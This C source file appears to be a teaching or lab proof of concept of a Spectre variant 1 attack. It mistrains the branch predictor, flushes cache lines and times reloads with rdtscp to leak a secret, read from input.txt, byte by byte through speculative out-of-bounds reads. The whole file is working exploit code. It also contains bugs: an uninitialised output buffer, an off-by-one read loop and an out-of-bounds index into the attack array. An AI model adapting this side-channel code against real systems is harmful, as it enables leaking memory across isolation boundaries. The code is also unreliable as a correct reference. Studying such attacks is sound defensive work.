#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include <x86intrin.h> 

void append(char* s, char c) {
    int len = strlen(s);
    s[len] = c;
    s[len+1] = '\0';
}

#define L3_CACHE_ACCESS 80
unsigned int arr1_size = 16;
uint8_t arr1[16] = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15};
uint8_t arr2[256 * 512];
bool attack[100];                //Boolean array to hold each try results, If TRUE then attack ELSE misstrain again.
int results[256];                //Holds the results for each character.

const char *readimage(char *filename)
{
    FILE *fp = fopen(filename, "rb");
    if (!fp) {
        perror("input.txt");
        exit(1);
    }

    // Find out the size of the file by going to its end and reporting the offset from the beginning in bytes
    fseek(fp, 0L, SEEK_END);
    long size = ftell(fp);
    rewind(fp);

    // allocate memory for entire content
    char *buffer = calloc(1, size + 1);
    if (!buffer) {
        fclose(fp);
        perror("calloc");
        exit(1);
    }

    // copy the file into the buffer 
    if (1 != fread(buffer, size, 1, fp)) {
        fclose(fp);
        free(buffer);
        fputs("entire read fails", stderr);
        exit(1);
    }

    fclose(fp);
    return (buffer);
}


/* 
int fetch_victim(): Used to mistrained or when ready attack the processor by making it falsely return an index bigger than arr1_size. When our processor is speculatively executing at some point 
it will skip the if stament and return out of range indices. By taking advantage of this we request the information desired to be loaded on the CPU cache and then retrieve it using side-channel
attacks. 
*/
int fetch_victim(size_t index)
{
    if (index < arr1_size)
    {
        return arr2[arr1[index] * 512];
    }
    return -1;
}

// Phase 1 - Misstrain processor by feeding processes. (e.g. Manipulating the cache state to remove data that the processor will need to determine the actual control flow.)
//         - Prepare for side-channel attack. In our case init arrays to hold the timing attack results(e.g. perform flush or evict part of a Flush+Reload or Evict-Reload attack.)

void train_branch_predictor(size_t target_idx, int tries)
{
    // Flush the arr2 out of cache memory
    for (size_t i = 0; i < 256; i++)
    {
        _mm_clflush(&arr2[i * 512]);
    }

    // Note that this might be a little overkill, since the entire array fits into a cache line, but better safe than sorry
    for (size_t i = 0; i < 16; i++) {
        _mm_clflush(&arr1[i]);
    }

    // Training idx is the correct idx that is within arr1_size, which will train the branch predictor that brach is mostly taken
    size_t train_idx = tries % arr1_size;
    //Repeat 100 times the misstrain and attack
    for (size_t i = 100; i > 0; i--)
    {
        _mm_clflush(&arr1_size);
        // This loop executes the delay inbetween the successive training loops. We tested _mm_lfence() as the paper says,
        // but it does not work
        for (size_t j = 0; j < 100; j++);

        //We should avoid the if-else condition here, as the if-else invokes the use of branch predictor here, which will then detect our logic here
        size_t idx = attack[i] * target_idx + (!attack[i]) * train_idx;
        // We don't want to have any extraneous data available to make predictions off of. Once again, might be overkill, but the exploit is touchy enough that this might be required.
        _mm_clflush(&target_idx);
        _mm_clflush(&train_idx);

        /* Call the victim function with the training_x (to mistrain branch predictor) or target_x (to attack the SECRET address) */
        fetch_victim(idx);
    }
}

// Unsigned long long is just too long to type for a single type name
typedef unsigned long long ull;

/* time_l3_access - after the branch predictor training is complete, we time how long 
 * it takes to access certain elements of the array, and based on the timing, we then
 * know where 
 *
 */
ull time_l3_access(size_t idx) {
    // We need this as a throwaway variable to hold the result of the register that RDTSCP returns
    unsigned int noop = 0;
    // Start the timer in cycles
    register ull start = __rdtscp(&noop);
    // Then we try to access the value from that particular page
    noop = arr2[idx * 512];
    // After the value access, we check the number of cycles that elapsed
    register ull delta = __rdtscp(&noop) - start;
    return delta;
}

// Overall attack function.
char read_byte(size_t target_idx)
{
    int j, k;

    // Initializing the results array
    memset(results, 0, sizeof(results));

    for (int tries = 250; tries > 0; --tries)
    {
        // First misstrain the proccesor.
        train_branch_predictor(target_idx, tries);

        //Side channel attack to retrieve the data.
        for (size_t i = 0; i < 256; i++)
        {
            size_t mix_i = ((i * 167) + 13) & 255;
            ull delta = time_l3_access(mix_i);

            // We note that we have no way of checking if the first 16 characters 
            // are loaded. Since we are only loading base64-encoded strings for memory,
            // this does not matter for our example, but it would be important to 
            // do so if we were to aim to scan the whole address space.
            if (delta <= L3_CACHE_ACCESS && mix_i != arr1[tries % arr1_size]) {
                results[mix_i]++; 
            }
        }

        /* Locate highest & second-highest results results tallies in j/k */
        j = k = -1;
        for (size_t i = 0; i < 256; i++)
        {
            if (j < 0 || results[i] >= results[j])
            {
                k = j;
                j = i;
            }
            else if (k < 0 || results[i] >= results[k])
            {
                k = i;
            }
        }
        if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
        {
            break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
        }
    }

    return (char) j;
}

int main()
{
    const char *secret = readimage("input.txt");

    // If we were doing a full scan of the address space, this could be any value 
    // past the beginning of the array, but this is sufficient for our purposes.
    size_t malicious_x = (size_t)(secret - (char *)arr1);
    size_t len = strlen(secret);

    //set all values of array 2 as 1
    for (size_t i = 0; i < sizeof(arr2); i++)
    {
        arr2[i] = 1; /* write to arr2 so in RAM not copy-on-write zero pages */
    }
    /* Here the bool values , for whether to attack or mistrain is set. 1 in every 10 will attack. */
    for (int i = 0; i < 100; i += 10)
    {
        attack[i] = true;
    }

    char str[len * sizeof(double)];
    for (size_t i = 0; i <= len; i++)
    {
        char base64 = read_byte(malicious_x++);
        if (base64 > 31 && base64 < 127)
        {
            append(str, base64);
        } else {
            append(str, 'A');
        }
    }

    FILE *f = fopen("output.txt", "w");
    if (!f)
    {
        printf("Error opening file!\n");
        exit(1);
    }
    fprintf(f, "%s\n", str);
    fclose(f);

    return 0;
}
